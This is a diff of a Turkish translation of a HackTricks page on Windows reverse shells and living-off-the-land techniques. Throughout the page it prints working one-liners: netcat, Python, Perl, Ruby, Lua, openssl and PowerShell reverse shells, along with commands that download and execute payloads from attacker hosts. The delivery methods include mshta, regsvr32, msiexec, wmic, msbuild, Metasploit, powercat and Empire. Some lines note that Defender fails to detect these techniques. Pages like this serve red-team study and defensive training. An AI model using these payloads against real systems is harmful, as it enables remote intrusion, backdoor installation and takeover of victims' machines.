@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>Sıfırdan kahramana AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahramana AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin**
+* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR'lar göndererek paylaşın.
 
 </details>
 
 **Try Hard Güvenlik Grubu**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ HackTricks'ı desteklemenin diğer yolları:
 ## Lolbas
 
 [lolbas-project.github.io](https://lolbas-project.github.io/) sayfası, Windows için [https://gtfobins.github.io/](https://gtfobins.github.io/) gibi bir şeydir.\
-Açıkçası, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **dizinlerin** nasıl kullanılabileceğini bilmek **yönlendirilmiş** bazı **işlemler** gerçekleştirmek için **keyifli olabilir.**
+Açıkçası, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **dizinlerin** nasıl kullanılabileceğini bilmek **yönlendirilmiş kodları yürütmek gibi** beklenmeyen bazı eylemleri gerçekleştirmek için **nasıl** (kötüye) **kullanılabilir** olduğunu bilmek faydalıdır.
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) taşınabilir ve güvenli bir Netcat alternatifidir**. Unix benzeri sistemlerde ve Win32'de çalışır. Güçlü şifreleme, program yürütme, özelleştirilebilir kaynak portları ve sürekli yeniden bağlanma gibi özelliklere sahip olan sbd, TCP/IP iletişimi için çok yönlü bir çözüm sunar. Windows kullanıcıları için, Kali Linux dağıtımındaki sbd.exe sürümü, Netcat için güvenilir bir alternatif olarak kullanılabilir.
+**[sbd](https://www.kali.org/tools/sbd/) taşınabilir ve güvenli bir Netcat alternatifidir**. Unix benzeri sistemlerde ve Win32'de çalışır. Güçlü şifreleme, program yürütme, özelleştirilebilir kaynak portları ve sürekli yeniden bağlantı gibi özelliklere sahip olan sbd, TCP/IP iletişimi için çok yönlü bir çözüm sunar. Windows kullanıcıları için, Kali Linux dağıtımından sbd.exe sürümü, Netcat için güvenilir bir alternatif olarak kullanılabilir.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -46,33 +46,34 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 ## Python
+
+Python, birçok Windows kabuğu oluşturma aracı için popüler bir dil olarak kullanılır. Python'un Windows üzerinde çalıştırılabilmesi, çeşitli kabuk oluşturma araçlarının geliştirilmesini kolaylaştırır. Python, Windows API'lerine erişmek için kullanılabilir ve Windows üzerinde işlemler gerçekleştirmek için geniş bir kütüphane desteği sunar. Bu nedenle, Python sıklıkla Windows kabuk oluşturma araçlarında tercih edilen bir dil olarak karşımıza çıkar.
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
 
-Perl, Windows için oldukça popüler bir betikleme dilidir. Perl betikleri, Windows üzerinde hızlı ve etkili bir şekilde çalışabilir. Perl betikleri genellikle dosya işleme, metin işleme ve sistem yönetimi gibi görevler için kullanılır. Perl betikleri, Windows üzerindeki birçok sistem çağrısını doğrudan destekler ve bu da Perl'in Windows üzerinde güçlü bir dil olmasını sağlar. Perl betikleri genellikle `.pl` uzantılı dosyalarda saklanır ve çalıştırılır. Windows'ta Perl betiklerini çalıştırmak için, öncelikle Perl yorumlayıcısını Windows makinenize yüklemeniz gerekir.
+Perl, Windows için oldukça popüler bir betikleme dilidir. Windows üzerinde Perl betiklerini çalıştırmak için ActivePerl veya Strawberry Perl gibi Perl dağıtımlarını kullanabilirsiniz. Perl betiklerini Windows üzerinde çalıştırmak için aşağıdaki adımları izleyebilirsiniz:
+
+1. Bir metin düzenleyici kullanarak Perl betiğinizi oluşturun veya düzenleyin (Örneğin: `script.pl`).
+2. Komut istemini açın ve Perl betiğini çalıştırmak için aşağıdaki komutu kullanın: `perl script.pl`.
+
+Bu adımları takip ederek Windows üzerinde Perl betiklerini başarıyla çalıştırabilirsiniz.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby, açık kaynaklı bir programlama dilidir. Ruby ile Windows üzerinde çalışan bir shell oluşturmak için **msfvenom** kullanılabilir. Örneğin, Ruby ile bir reverse shell oluşturmak için aşağıdaki komutu kullanabilirsiniz:
-
-```plaintext
-msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f rb > shell.rb
-```
-
-Bu komut, Ruby ile yazılmış bir reverse shell betiği oluşturacaktır. Oluşturulan betiği hedef makinede çalıştırarak bir shell oturumu alabilirsiniz.
+Ruby, açık kaynaklı bir programlama dilidir ve genellikle Ruby on Rails web uygulama çerçevesinde kullanılır. Ruby ile Windows üzerinde çalışan bir kabuk oluşturmak için `msfvenom` kullanılabilir. Bu, hedef Windows makinesine bir kabuk yüklemek için kullanılabilir. Kabuk yüklemek için Ruby ile bir kabuk oluşturmak için aşağıdaki adımları izleyebilirsiniz.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama diline benzer bir sözdizimine sahiptir ve C ile kolayca entegre edilebilir. Lua, oyun geliştirme endüstrisinde sıkça kullanılan bir dil olup, basit ve hızlı bir şekilde betikler yazmak için idealdir. Lua, genellikle oyun motorlarında ve diğer uygulamalarda kullanılan bir betikleme dili olarak tercih edilir.
+Lua, bir betik dili ve hafif bir çoklu paradigma programlama dilidir. Lua, C programlama dili ile kolayca entegre edilebilir ve genellikle oyun geliştirme endüstrisinde kullanılır. Lua, basit sözdizimi ve hızlı yürütme süresi ile bilinir. Lua, genellikle betik dili olarak kullanılır ve sistem programlama için uygun değildir. Lua, esnek bir dil olup, çeşitli platformlarda çalışabilir.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -84,7 +85,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Hedef
+Kurban
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -93,6 +94,8 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
 ## Powershell
+
+Powershell, Windows işletim sistemi için geliştirilmiş bir komut satırı aracıdır. Powershell, Windows sistemlerinde otomasyon görevleri gerçekleştirmek için kullanılır. Powershell, geniş bir yelpazede işlevsellik sunar ve sistem yöneticileri tarafından sıkça tercih edilir. Powershell skriptleri, dosya işlemleri, ağ iletişimi, sistem yapılandırması gibi birçok alanda kullanılabilir. Powershell, Windows işletim sistemi üzerinde güçlü bir araçtır ve siber güvenlik uzmanları tarafından da sıkça kullanılır.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -125,11 +128,11 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **hta-psh ters kabuk örneği (hta kullanarak PS arka kapı indirme ve çalıştırma)**
+#### **hta-psh ters kabuk örneği (hta kullanarak PS arka kapıyı indirip çalıştırma)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Koadic zombi'sini çok kolay bir şekilde stager hta kullanarak indirebilir ve çalıştırabilirsiniz**
+**Koadic zombi dosyasını stager hta kullanarak çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
 
 #### hta örneği
 
@@ -167,8 +170,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
-
-Mshta, Microsoft HTML Application Host, is a utility that executes HTA files. Metasploit has a module that can be used to execute malicious payloads through Mshta. This technique can be useful for bypassing application whitelisting or executing code through a trusted Windows utility.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -270,7 +271,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Koadic zombi dosyasını regsvr aracılığıyla çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
+**Koadic zombi dosyasını regsvr aşamasını kullanarak çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
 
 ## Certutil
 
@@ -320,7 +321,7 @@ Saldırgan
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Hedef:
+Kurban:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -328,7 +329,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) alındı
+* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
@@ -344,9 +345,9 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Algılanamaz**
+**Algılanmadı**
 
-**Koadic zombi dosyasını wmic aracılığıyla çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
+**Koadic zombisini çok kolay bir şekilde wmic aşamasını kullanarak indirebilir ve çalıştırabilirsiniz**
 
 ## Msbuild
 
@@ -363,13 +364,13 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kurban makinede C# kodunu derleyin.
+Kurban makinede C# kodunu derle.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
 İşte temel bir C# ters kabuk indirebilirsiniz: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Algılanmadı**
+**Tespit edilmedi**
 
 ## **Regasm/Regsvc**
 
@@ -401,7 +402,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Sunucuda betiği hizmete başlatın ve kurbanın ucunda çalıştırın:
+Kurbanın sonunda betiği çalıştırmak için bir web sunucusunda betiği sunmaya başlayın:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -413,15 +414,15 @@ Defender henüz kötü amaçlı kod olarak algılamıyor (henüz, 3/04/2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-İndirin, bir web sunucusu başlatın, dinleyiciyi başlatın ve kurbanın ucunda çalıştırın:
+İndir, bir web sunucusu başlat, dinleyiciyi başlat ve kurbanın ucunda çalıştır:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Defender henüz kötü amaçlı kod olarak algılamıyor (ancak, 3/04/2019).**
+Defender henüz kötü amaçlı kod olarak algılamıyor (henüz, 3/04/2019).
 
 **Powercat tarafından sunulan diğer seçenekler:**
 
-Bind shell'ler, Ters shell (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Payload'lar oluşturma, Dosyalar sunma...
+Bağlama kabukları, Ters kabuk (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Yük oluşturma, Dosyaları sunma...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -442,7 +443,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Bir powershell başlatıcısı oluşturun, bir dosyaya kaydedin ve onu indirip çalıştırın.
+Bir powershell başlatıcısı oluşturun, bir dosyaya kaydedin ve indirip çalıştırın.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -452,7 +453,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Metasploit arka kapı için unicorn kullanarak bir powershell versiyonu oluşturun
+Unicorn kullanarak metasploit arka kapısının bir PowerShell versiyonunu oluşturun
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -460,7 +461,7 @@ Oluşturulan kaynakla msfconsole'ı başlatın:
 ```
 msfconsole -r unicorn.rc
 ```
-Hedefte _powershell\_attack.txt_ dosyasını sunan bir web sunucusu başlatın ve aşağıdaki komutu hedefte çalıştırın:
+Başlangıçta _powershell\_attack.txt_ dosyasını sunan bir web sunucusu başlatın ve kurban üzerinde şunu çalıştırın:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -484,7 +485,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Bazı saldırgan PS modülleri
 ​
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -496,8 +497,8 @@ HackTricks'i desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
